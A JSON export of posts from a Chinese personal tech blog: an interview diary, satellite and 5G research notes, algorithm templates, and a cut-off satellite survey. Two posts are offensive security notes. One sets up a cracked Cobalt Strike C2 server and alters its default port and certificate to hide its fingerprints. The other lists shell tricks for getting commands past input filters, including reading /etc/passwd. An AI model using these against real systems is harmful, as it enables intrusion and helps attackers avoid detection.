[{"title":"vivo提前批安全岗记录","url":"http://b1ng0.top/2020/06/20/vivo提前批安全岗记录/","content":"<h2 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h2><p>虽然拒了，但总归还是要记一下的。</p>\n<h2 id=\"0x02-笔试\"><a href=\"#0x02-笔试\" class=\"headerlink\" title=\"0x02 笔试\"></a>0x02 笔试</h2><p>6.07，三道编程题，都是些高频题，过了1.9道，第三道处理输入输出半天没弄好ORZ</p>\n<p>第一题–<a href=\"https://leetcode-cn.com/problems/can-place-flowers/\" target=\"_blank\" rel=\"noopener\">种花问题</a></p>\n<p>第二题–<a href=\"https://leetcode-cn.com/problems/super-egg-drop/\" target=\"_blank\" rel=\"noopener\">扔鸡蛋</a></p>\n<p>第三题–<a href=\"https://leetcode-cn.com/problems/merge-k-sorted-lists/\" target=\"_blank\" rel=\"noopener\">合并K个排序链表</a></p>\n<h2 id=\"0x03-一面\"><a href=\"#0x03-一面\" class=\"headerlink\" title=\"0x03 一面\"></a>0x03 一面</h2><p>6.09，总共聊了28min，感觉是个Leader在面，但是自我介绍之后就像HR一样聊人生了，主动往技术细节上引都不接茬，差点以为凉了。</p>\n<p>主要问题：</p>\n<p>自我介绍<br>授权测试项目的内容<br>是否做过黑产、灰产<br>最有成就感的事<br>学习安全的过程<br>对安全的认知<br>大学到研究生都是通信，师兄师姐有没有做安全的<br>缺点和优点<br>将来的打算<br>怎么量化你的目标<br>觉得vivo的安全要做些什么<br>有没有想去的公司<br>为什么觉得甲方安全比乙方好</p>\n<p>反问：</p>\n<p>给我一点建议<br>vivo的安全具体是做那些内容<br>什么时候出结果</p>\n<h2 id=\"0x04-二面\"><a href=\"#0x04-二面\" class=\"headerlink\" title=\"0x04 二面\"></a>0x04 二面</h2><p>6.10，7min速战速决，也没给反问时间，面完更疑惑了。</p>\n<p>主要问题：</p>\n<p>自我介绍<br>是否保研<br>六级过没<br>成绩是否是写的50%<br>两个项目哪个是自己主导的<br>意向城市<br>未来三到五年规划</p>\n<p>最后来了句你技术面评价比较高（？？？<br>等通知，然后直接拜拜没有反问</p>\n<h2 id=\"0x05-结果\"><a href=\"#0x05-结果\" class=\"headerlink\" title=\"0x05 结果\"></a>0x05 结果</h2><p>6.17：收到录用通知</p>\n<p>没有太过纠结，基于一些原因觉得不太合适就直接拒了，还是很感激vivo这次机会的！</p>\n<p>————– 6.22 update————– </p>\n<p>刚拒完vivo，就发现自己被头条拒了，简历筛选都没过，上帝欲使人疯狂，必先使其膨胀（笑哭。。。</p>\n<p>————– 6.29 update————– </p>\n<p>厚着脸皮重新投到部门HR，没想到头条又给了次机会，转到安全研发面试，感觉直接一面挂就不写面经了，整体面试体验极佳，说不清楚的也会进行引导，没想到面试也能学到一些姿势，奈何自己太菜了。。。</p>\n","categories":[],"tags":["秋招"]},{"title":"vps搭建CobaltStrike","url":"http://b1ng0.top/2020/05/25/vps搭建CobaltStrike/","content":"<h2 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h2><p>手贱重装了下服务器，各种线上环境都没了，在这里记录一下cs的搭建，免得每次都像个憨憨到处找。。。</p>\n<h2 id=\"0x02-服务端搭建\"><a href=\"#0x02-服务端搭建\" class=\"headerlink\" title=\"0x02 服务端搭建\"></a>0x02 服务端搭建</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 1. CobaltStrike破解版下载</span><br><span class=\"line\">// 来自ssooking师傅的破解：https://www.cnblogs.com/ssooking/p/12535998.html</span><br><span class=\"line\">$ git <span class=\"built_in\">clone</span> https://gitee.com/ssooking/cobaltstrike-cracked.git</span><br><span class=\"line\"></span><br><span class=\"line\">// 2. vps上安装java环境 ubuntu环境</span><br><span class=\"line\">// JDK官网下载还要注册 亲测使用openJDK也完全可以</span><br><span class=\"line\">$ apt install openjdk-8-jre-headless</span><br><span class=\"line\">// 测试</span><br><span class=\"line\">$ java -version</span><br><span class=\"line\">openjdk version <span class=\"string\">\"1.8.0_252\"</span></span><br><span class=\"line\">OpenJDK Runtime Environment (build 1.8.0_252-8u252-b09-1~18.04-b09)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM (build 25.252-b09, mixed mode)</span><br><span class=\"line\"></span><br><span class=\"line\">// 3. 解压cobaltstrike4.0-cracked 运行teamserver即可</span><br><span class=\"line\">$ ./teamserver 公网ip password</span><br><span class=\"line\">[*] Will use existing X509 certificate and keystore (<span class=\"keyword\">for</span> SSL)</span><br><span class=\"line\">[+] Team server is up on *****</span><br><span class=\"line\">[*] SHA256 <span class=\"built_in\">hash</span> of SSL cert is: ************************************************</span><br><span class=\"line\"></span><br><span class=\"line\">// 个人习惯nohup长期运行</span><br><span class=\"line\">$ nohup ./teamserver 公网ip password &amp;</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-客户端连接\"><a href=\"#0x03-客户端连接\" class=\"headerlink\" title=\"0x03 客户端连接\"></a>0x03 客户端连接</h2><p>客户端也是用上面的cobaltstrike4.0-cracked文件夹，安装好java环境后双击start.bat即可：</p>\n<p><img src=\"/images/image-20200525112443061.png\" alt></p>\n<p>按服务端配置填写connect:</p>\n<p><img src=\"/images/image-20200525112950735.png\" alt></p>\n<h2 id=\"0x04-CS简单加固\"><a href=\"#0x04-CS简单加固\" class=\"headerlink\" title=\"0x04 CS简单加固\"></a>0x04 CS简单加固</h2><ul>\n<li><p>修改默认端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 默认端口50050 在teamserver中改掉即可</span><br><span class=\"line\">$ vim teamserver</span><br><span class=\"line\">// 最后一行 50050 改成放行的端口</span><br><span class=\"line\"># start the team server.</span><br><span class=\"line\">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>修改证书信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 可以重新生成一次 但是太麻烦 不如直接改掉CobaltStrike特征 又不是拿来干坏事(笑</span><br><span class=\"line\">$ vim teamserver</span><br><span class=\"line\">// keytool部分 在改端口的前两行</span><br><span class=\"line\">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</span><br><span class=\"line\">//瞎改下</span><br><span class=\"line\">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=abc, OU=abc, O=abc, L=abc, S=abc, C=abc&quot;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://www.cnblogs.com/ssooking/p/12535998.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ssooking/p/12535998.html</a></p>\n<p><a href=\"https://www.3hack.com/note/96.html\" target=\"_blank\" rel=\"noopener\">https://www.3hack.com/note/96.html</a></p>\n","categories":[],"tags":["CobaltStrike"]},{"title":"gitignore不忽略指定文件","url":"http://b1ng0.top/2020/05/07/gitignore不忽略指定文件/","content":"<p>突然产生这么个需求，尝试直接用<em>！</em>取反，结果并行不通.</p>\n<p>整体上需要先忽略父级目录下所有东西，再保留指定文件(当然文件在根目录的话，不写进来不就是保留了嘛。。。)：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 保留dir1下的test.txt</span></span><br><span class=\"line\">dir1/*</span><br><span class=\"line\">!dir1/test.txt</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["git"]},{"title":"EXata中的卫星仿真","url":"http://b1ng0.top/2020/04/14/exata中的卫星仿真/","content":"<blockquote>\n<p>这破项目，什么时候是个头。。。</p>\n<p>我的burp有一个月没打开过了，好想挖洞鸭！！！</p>\n</blockquote>\n<h2 id=\"抽象卫星模型：\"><a href=\"#抽象卫星模型：\" class=\"headerlink\" title=\"抽象卫星模型：\"></a>抽象卫星模型：</h2><p><a href=\"http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Developer/Abstract%20Satellite.html\" target=\"_blank\" rel=\"noopener\">http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Developer/Abstract%20Satellite.html</a></p>\n<p>这是卫星网络的抽象模型。 每个卫星网络都分组为子网。 每个卫星子网都只有一个卫星节点和许多地面节点。 与子网关联的地面节点始终会传输到指定的子网卫星节点。 因此，<strong>不涉及切换</strong>。 而且，卫星节点是弯管卫星（仅中继数据）。 卫星节点从地面节点接收数据时，会将数据广播到子网中的所有其他地面节点，但不广播到发起数据的地面节点。 最后，卫星节点一定不能生成任何数据包。 因此，卫星节点无法运行应用程序或路由协议。</p>\n<p>考虑到无损线性延迟过程，该模型代表了卫星模型的最高抽象水平。 需要对卫星系统进行更详细模拟的开发人员应考虑使用“卫星模型库”中介绍的高级卫星附加模块。</p>\n<h2 id=\"支持RSV的Aloha卫星模型（Satellite-RSV）\"><a href=\"#支持RSV的Aloha卫星模型（Satellite-RSV）\" class=\"headerlink\" title=\"支持RSV的Aloha卫星模型（Satellite-RSV）\"></a>支持RSV的Aloha卫星模型（Satellite-RSV）</h2><p><a href=\"http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Wireless/Satellite-RSV.html\" target=\"_blank\" rel=\"noopener\">http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Wireless/Satellite-RSV.html</a></p>\n<p>支持Reed-Solomon / Viterbi（RSV）的Aloha卫星模型是基于Aloha协议的需求分配多路访问（DAMA）方案。 该模型<strong>既可以用作弯管卫星，也可以用作带有机载有效载荷的卫星</strong>。<br>该系统的基本模型是利用外部Reed-Solomon（RS）和级联的Viterbi内部卷积码（RSV）的双向突发传输。 这包括考虑编码和调制开销，增加斜坡上升/下降保护时间以及插入前导码。<br>此外，该模型还允许用户指定来自相邻频道和相邻卫星的干扰电平以及交叉极化能量泄漏。<br>Aloha卫星模型由Satellite-RSV PHY和MAC模型组成。 卫星的信道仿真使用标准的EXata传播建模，因此可以配置为使用EXata移动文件选项对卫星运动进行建模。</p>\n<h2 id=\"抽象网络方程–卫星（ANESAT）模型\"><a href=\"#抽象网络方程–卫星（ANESAT）模型\" class=\"headerlink\" title=\"抽象网络方程–卫星（ANESAT）模型\"></a>抽象网络方程–卫星（ANESAT）模型</h2><p><a href=\"http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Wireless/ANESAT.html\" target=\"_blank\" rel=\"noopener\">http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Wireless/ANESAT.html</a></p>\n<p>一个系统由一个或多个跨一组双向通道运行的子网组成。 每个子网具有单个下游（或前向）链路和多个关联的上游链路。 每个下行链路（如果基于从网络层出队的优先级以TDMA方式操作）。 每个子网都有一个前端（可以是卫星或前端地面站）以及零个或多个客户端。 上游和下游通道的使用完全受前端过程的控制。 每个上游都包含一组共享的数据，以允许将其作为一个组进行调度。 当头端的两个或多个子网想要共享一组通用的上游通道时，通常会发生这种情况。 每个发射机（即连接到卫星信道的节点/接口对）可以可选地用入口流量调节器实例化。 该业务量调节器限制了从终端发送的业务量，而不管该终端可用的可用串行化速率如何。 所有终端，包括前端，都在网络层处理数据包。 因此，可以在客户端模型上强加其他排队规则。 这些规则包括严格的优先级排队和加权公平排队。</p>\n<h2 id=\"STK和Exata联合仿真\"><a href=\"#STK和Exata联合仿真\" class=\"headerlink\" title=\"STK和Exata联合仿真\"></a>STK和Exata联合仿真</h2><p><a href=\"http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Developer/STK_Connect.html\" target=\"_blank\" rel=\"noopener\">http://exata.b1ng0.top/wwhelp/wwhimpl/js/html/wwhelp.htm#href=Developer/STK_Connect.html</a></p>\n<p>STK接口提供了一种将EXata与STK进行连接的方法。 它允许EXata仿真使用STK的无线传播模块和天线模型进行信号传播。 另外，它允许STK提供节点位置更新，从而控制移动性。</p>\n<p><img src=\"/images/2020.4.14.1.png\" alt=\"image-20200412170810333\"></p>\n<p>主要功能：</p>\n<ul>\n<li>与STK进行通信；</li>\n<li>使用STK的无线传播模块进行信号传播，代替EXata的传播模块；</li>\n<li>使用STK的天线模型进行天线相关的计算；</li>\n<li>允许STK控制节点移动性。</li>\n</ul>\n<p><img src=\"/images/2020.4.14.2.png\" alt=\"image-20200427102642893\"></p>\n","categories":[],"tags":["卫星网络 EXata"]},{"title":"星地5G融合初探","url":"http://b1ng0.top/2020/03/29/星地5G融合初探/","content":"<blockquote>\n<p>迫于论文开题方向，最近主要在看3gpp、ITU等标准化组织关于星地融合（卫星和5g融合）的相关研究，跟进SaT5G（Satellite and Terrestrial Network for 5G）项目的研究进展。下面是基于标准文档和相关解读整理的卫星5g融合和5g回传的现状。</p>\n</blockquote>\n<h2 id=\"3GPP与卫星相关的研究\"><a href=\"#3GPP与卫星相关的研究\" class=\"headerlink\" title=\"3GPP与卫星相关的研究\"></a>3GPP与卫星相关的研究</h2><p>目前找到的与卫星相关的标准文档主要有以下几篇：</p>\n<ul>\n<li>3GPP TS 22.261 on satellite access</li>\n<li>3GPP TR 22.822 “Study on using Satellite Access in 5G” </li>\n<li>3GPP TR 38.811 “Study on NR to support non-terrestrial networks” </li>\n<li>3GPP TR 23.737 “Study on architecture aspects for using satellite access in 5G; (Release 16)” </li>\n<li>3GPP TR 38.821 “Study on solutions for NR to support non-terrestrial networks (NTN) (Release 16)”</li>\n</ul>\n<p>3GPP从R14开始着手开展星地融合的研究工作。在TS22.261中，对卫星在5G系统中的角色和优势进行了探讨，作为5G多种接入技术之一，卫星在一些要求广域覆盖的工业应用场景中具有显著优势。卫星网络可以在地面5G覆盖的薄弱地区提供低成本的覆盖方案，对于5G网络中的M2M/IoT，以及为高速移动载体上的乘客提供无所不及的网络服务，借助卫星优越的广播/多播能力，可以为网络边缘网元及用户终端提供广播/多播信息服务。</p>\n<p>在2017年底发布的技术报告22.822中，3GPP工作组SA1对与卫星相关的接入网协议及架构进行了评估，并计划进一步开展基于5G的接入研究。在这份报告中，定义了在5G中使用卫星接入的三大类用例，分别是连续服务、泛在服务和扩展服务。并讨论了新的及现有服务的需求，卫星终端特性的建立、配置与维护，以及在卫星网络与地面网络间的切换问题。</p>\n<p>在3GPP名为“面向‘非地面网络’中的5G新空口”研究项目中，定义了包括卫星网络在内的非地面网络（NTN:Non-terrestrial networks）的部署场景。按照3GPP的定义，5G网络中的NTN应用场景包括8个增强型移动宽带（eMBB）场景和2个大规模机器类通信（mMTC）场景。借助卫星的广域覆盖能力，可以使运营商在地面网络基础设施不发达地区提供5G商用服务，实现5G业务连续性，尤其是在应急通信、海事通信、航空通信及铁路沿线通信等场景中发挥作用。</p>\n<p>38.811规定的卫星网络架构可能包含的系统组成包括：</p>\n<ul>\n<li>NTN终端：3GPP 用户终端（UE）和非3GPP UE （卫星终端）</li>\n<li>用户链路(Service Link)：UE和卫星之间的链路</li>\n<li>空间平台(Space Platform)：搭载弯管或者具备星上处理能力的卫星</li>\n<li>星间链路(ISL: Inter-Satellite Links)：对于具备星上处理能力卫星间的链路</li>\n<li>信关站(Gateway)：连接卫星和地面核心网的网元</li>\n<li>馈电链路：卫星与地面关口站之间的链路</li>\n</ul>\n<p><img src=\"/images/2020.3.29.1.png\" alt=\"img\"></p>\n<p>在非地面网络与地面5G融合的网络架构上，3GPP提出了星地融合的4种网络架构初步模型。38.811还对卫星5G场景中的传输延时、多普勒频移进行了估计，并对在非地面网络中部署5G新空口需要做的适应性修改进行了讨论，包括由于卫星等空间飞行器的移动性带来的切换和寻呼问题、定时提前的调整、下行链路同步等问题，星地链路长延时对HARQ、MAC/RLC过程、物理层ACM及功率控制等过程的影响，卫星小区尺寸过大给PRACH和随机过程带来的影响以及对随机接入响应消息中定时提前的影响，多径时延扩展带来的问题，双工模式问题，对CP-OFDM技术在卫星上的适用性也进行了分析。</p>\n<p><img src=\"/images/2020.3.29.2.png\" alt=\"img\"></p>\n<h2 id=\"ITU的星地5G融合\"><a href=\"#ITU的星地5G融合\" class=\"headerlink\" title=\"ITU的星地5G融合\"></a>ITU的星地5G融合</h2><p>针对卫星与地面5G融合的问题，国际电信联盟（ITU，International Telecommunication Union）提出了星地5G融合的4种应用场景，包括中继到站、小区回传、动中通及混合多播场景，并提出支持这些场景必须考虑的关键因素，包括多播支持、智能路由支持、动态缓存管理及自适应流支持、延时、一致的服务质量、NFV（Network Function Virtualization，网络功能虚拟化）/SDN（Software Defined Network，软件定义网络）兼容、商业模式的灵活性等。</p>\n<p><img src=\"/images/2020.3.29.3.png\" alt=\"img\"></p>\n<p>(a)中继到站场景</p>\n<p><img src=\"/images/2020.3.29.4.png\" alt=\"img\"></p>\n<p>(b)小区回传场景</p>\n<p><img src=\"/images/2020.3.29.5.png\" alt=\"img\"></p>\n<p>(c)动中通场景</p>\n<p><img src=\"/images/2020.3.29.6.png\" alt=\"img\"></p>\n<p>(d)混合多播场景</p>\n<h2 id=\"5g回传\"><a href=\"#5g回传\" class=\"headerlink\" title=\"5g回传\"></a>5g回传</h2><p>5g整体可以划分为接入网、承载网、核心网，承载网就是专门负责承载数据传输的网络。整个通信网络的数据传输，都是由承载网负责的，不仅连接接入网和核心网，它也存在于接入网网元之间，以及核心网网元之间。</p>\n<p><img src=\"/images/2020.3.29.7.png\" alt=\"img\"></p>\n<p>5g基站与核心网之间的数据传输属于承载网络的范畴，而在5G网络中，接入网不再是由BBU、RRU、天线这些东西组成，而是被重构为CU（Centralized unit，集中单元）、DU（Distribute Unit，分布单元）和AAU（Active Antenna Unit，有源天线单元）这3个功能实体，依据3gpp标准，CU、DU、AAU可以采取分离或合设的方式，会出现多种网络部署形态：</p>\n<p><img src=\"/images/2020.3.29.8.png\" alt=\"img\"></p>\n<p>承载网随着RAN架构的重构，划分为前传网络、中传网络和回传网络三部分。前传、中传、回传是不同实体之间的连接：AAU和DU之间是前传网络、DU和CU之间是中传网络、CU以上是回传网络。</p>\n<p>传统的回传技术有两种:无线回传，光纤回传。这两种技术都广泛应用于当前的LTE网络中。两种回传方式每个运营商各有偏好，从全球统计数据来看，绝大部分网络都是选用无线回传，但在中国刚好相反，仅在少数应急场景才动用无线回传。</p>\n<p>但在5G时代，高密集组网的需求下，全光纤组网的成本让运营商难以承担。前段时间任正非就提出了5G和微波技术结合的方向，微波回传与光纤回传混合使用这也将是未来5G回传的主流趋势。</p>\n<p>传统的微波回传应用的是6-42GHz频段，平均容量在50Mbps至500Mbps之间，而对于5G时代，这一需求可高达10-20G，所以，传统微波回传是无法满足5G时代的基站回传容量需求的。于是业界将眼光投向了能提供超大带宽的E-Band微波。E频段指频率在80GHz附近的微波频段，实际分配频段为71-76GHz和81-86GHz的对称两段，可用总频宽达10GHz。较传统的3.5-112M信道带宽，E频段可以使用惊人的1000MHz至2000MHz带宽，再采用高阶调制方式、多频段聚合和MIMO等技术后，回传容量可高达20Gbps以上。面向未来，微波通信技术还将从E波段向W波段（92-115GHz）和D波段（130-175GHz）扩展，可实现100Gbps的高需求。</p>\n<p>关于无线回传，另一种方案是把无线接入网和回传集成，这也是3GPP R16的工作项目。利用Massive MIMO多波束的特性，将无线接入和回传集成，让每个微站通过无线“自回传”实现更加灵活、简单、低成本的基站部署。</p>\n","categories":[],"tags":["卫星网络 5G"]},{"title":"bash tricks","url":"http://b1ng0.top/2020/03/13/bash tricks/","content":"<blockquote>\n<p>在推上看到了一些新姿势，结合以前的重新总结一下linux下执行命令的技巧。</p>\n</blockquote>\n<p>cat&lt;1.txt</p>\n<p><img src=\"/images/2020.2.30.1.png\" alt=\"img\"></p>\n<p>cat$IFS$91.txt</p>\n<p><img src=\"/images/2020.2.30.2.png\" alt=\"img\"></p>\n<p>cat${IFS}1.txt</p>\n<p><img src=\"/images/2020.2.30.3.png\" alt=\"img\"></p>\n<p>cat&lt;&gt;1.txt</p>\n<p><img src=\"/images/2020.2.30.4.png\" alt=\"img\"></p>\n<p>{cat,1.txt}  </p>\n<p>// 带参数的情况：{ls,-las,/var}</p>\n<p><img src=\"/images/2020.2.30.5.png\" alt=\"img\"></p>\n<p>CMD=$’\\x201.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/2020.2.30.6.png\" alt=\"img\"></p>\n<p>CMD=$’\\x0a1.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/2020.2.30.7.png\" alt=\"img\"></p>\n<p>CMD=$’\\x091.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/2020.2.30.8.png\" alt=\"img\"></p>\n<p>IFS=,;`cat&lt;&lt;&lt;cat,1.txt`</p>\n<p><img src=\"/images/2020.2.30.12.png\" alt=\"image-20200427094309711\"></p>\n<p>X=$’cat\\x20/etc/passwd’&amp;&amp;$X ubuntu下没有测试成功</p>\n<p>!! 执行上一条命令 ！+ 数字 执行历史命令</p>\n<p><img src=\"/images/2020.2.30.9.png\" alt=\"img\"></p>\n<p>绕过其他字符( . / ; ` ‘ &gt; 等)的姿势:</p>\n<p>1.从环境变量(env)中提取：</p>\n<p><img src=\"/images/2020.2.30.10.png\" alt=\"img\"></p>\n<ol start=\"2\">\n<li>base64+管道符执行：</li>\n</ol>\n<p><img src=\"/images/2020.2.30.11.png\" alt=\"img\"></p>\n<h2 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h2><p><a href=\"https://twitter.com/konsolitus/status/1241610891235225601\" target=\"_blank\" rel=\"noopener\">https://twitter.com/konsolitus/status/1241610891235225601</a></p>\n<p><a href=\"https://b1ng0.top/2018/11/15/Blank Bypass/\">https://b1ng0.top/2018/11/15/Blank%20Bypass/</a></p>\n","categories":[],"tags":["bash"]},{"title":"一些算法题套路","url":"http://b1ng0.top/2020/03/01/一些算法题套路/","content":"<blockquote>\n<p>最近刷leetcode上瘾，准备刷完一个tag就总结一下基本的写法，长期更新。。。</p>\n</blockquote>\n<h2 id=\"二分查找\"><a href=\"#二分查找\" class=\"headerlink\" title=\"二分查找\"></a>二分查找</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 前提是数组有序 O(logn)</span></span><br><span class=\"line\"><span class=\"comment\">// 例子:在数组中查找一个数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">binary_search</span><span class=\"params\">(<span class=\"keyword\">int</span>[] nums, <span class=\"keyword\">int</span> target)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> left = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> right = nums.length-<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left&lt;=right) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> mid = left + (right - left) / <span class=\"number\">2</span>; <span class=\"comment\">//防止溢出</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(nums[mid] == target) &#123; </span><br><span class=\"line\">            <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(nums[mid] &lt; target) &#123;</span><br><span class=\"line\">            left = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(nums[mid] &gt; target) &#123;</span><br><span class=\"line\">            right = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> -<span class=\"number\">1</span>; <span class=\"comment\">//没找到</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"双指针\"><a href=\"#双指针\" class=\"headerlink\" title=\"双指针\"></a>双指针</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 快慢指针：主要对于链表操作，判断是否有环、寻找链表中点，思路比较简单，就不写代码了。</span></span><br><span class=\"line\"><span class=\"comment\">// 左右指针：需要数组有序，从两边到中间，O(n)</span></span><br><span class=\"line\"><span class=\"comment\">// 例子: 反转数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">(<span class=\"keyword\">int</span>[] nums)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> left = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> right = nums.length - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (left &lt; right) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> temp = nums[left];</span><br><span class=\"line\">        nums[left] = nums[right];</span><br><span class=\"line\">        nums[right] = temp;</span><br><span class=\"line\">        left++; right--;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>## 滑动窗口\n</code></pre><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 双指针的高阶用法，将嵌套的循环问题，转换为单循环问题，降低时间复杂度。</span></span><br><span class=\"line\"><span class=\"comment\">// 解决各种子串(子数组)问题.</span></span><br><span class=\"line\"><span class=\"comment\">// 核心思想是将满足要求的子串作为窗口在整个数组间移动，一次循环得到结果，O(n)</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["algorithm"]},{"title":"低轨卫星星座系统调研","url":"http://b1ng0.top/2020/02/29/低轨卫星星座系统调研/","content":"<h1 id=\"低轨卫星星座系统调研\"><a href=\"#低轨卫星星座系统调研\" class=\"headerlink\" title=\"低轨卫星星座系统调研\"></a>低轨卫星星座系统调研</h1><h2 id=\"低轨卫星系统概况\"><a href=\"#低轨卫星系统概况\" class=\"headerlink\" title=\"低轨卫星系统概况\"></a>低轨卫星系统概况</h2><table>\n<thead>\n<tr>\n<th></th>\n<th><strong>铱星</strong></th>\n<th><strong>波音</strong></th>\n<th><strong>LeoSat</strong></th>\n<th><strong>OneWeb</strong></th>\n<th><strong>星链</strong></th>\n<th><strong>三星</strong></th>\n<th><strong>O3b</strong></th>\n<th><strong>TeleSat</strong>  